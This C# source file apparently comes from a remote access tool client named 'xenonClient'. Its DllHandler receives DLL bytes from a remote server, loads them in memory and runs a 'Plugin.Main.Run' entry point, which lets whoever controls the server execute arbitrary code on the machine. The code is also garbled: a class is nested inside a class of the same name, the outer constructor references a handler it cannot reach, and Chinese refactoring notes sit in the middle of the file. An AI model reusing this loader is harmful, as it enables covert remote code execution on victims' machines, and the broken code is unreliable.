using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace xenonClient
{
    class DllHandler
    {

        public DllHandler()
        {
            AppDomain.CurrentDomain.AssemblyResolve += CurrentDomain_AssemblyResolve;
        }

        // 重构目标：
        // 1. 提高代码的可读性和可维护性。
        // 2. 使用常量替代魔法数字，提高代码的可理解性。
        // 3. 异常处理时，更详细地记录错误信息。
        // 4. 确保异步方法的异常被正确处理。
        
        public class DllHandler
        {
            private const byte GetDll = 1;
            private const byte HasDll = 0;
            private const byte Fail = 2;
            private const byte Success = 3;
            private const string ClassPath = "Plugin.Main";
        
            public Dictionary<string, Assembly> Assemblies { get; } = new Dictionary<string, Assembly>();
        
            public async Task DllNodeHandler(Node subServer)
            {
                try
                {
                    byte[] nameBytes = await subServer.ReceiveAsync();
                    string dllName = Encoding.UTF8.GetString(nameBytes);
                    Console.WriteLine(dllName);
        
                    if (!Assemblies.ContainsKey(dllName))
                    {
                        await subServer.SendAsync(new byte[] { GetDll });
                        byte[] dllBytes = await subServer.ReceiveAsync();
                        Console.WriteLine(dllBytes.Length);
                        Assemblies[dllName] = Assembly.Load(dllBytes);
                    }
                    else
                    {
                        await subServer.SendAsync(new byte[] { HasDll });
                    }
        
                    object activatedDll = Activator.CreateInstance(Assemblies[dllName].GetType(ClassPath));
                    MethodInfo method = activatedDll.GetType().GetMethod("Run", BindingFlags.Instance | BindingFlags.Public);
                    if (method != null)
                    {
                        await (Task)method.Invoke(activatedDll, new object[] { subServer });
                    }
                    else
                    {
                        Console.WriteLine("Method 'Run' not found.");
                        await subServer.SendAsync(new byte[] { Fail });
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine($"Error: {e.Message}\nStackTrace: {e.StackTrace}");
                    await subServer.SendAsync(new byte[] { Fail });
                    await subServer.SendAsync(Encoding.UTF8.GetBytes(e.Message));
                }
            }
        
            private static Assembly CurrentDomain_AssemblyResolve(object sender, ResolveEventArgs args)
            {
                if (new AssemblyName(args.Name).Name == "xenonClient")
                {
                    return Assembly.GetExecutingAssembly();
                }
                return null;
            }
        }
    }
}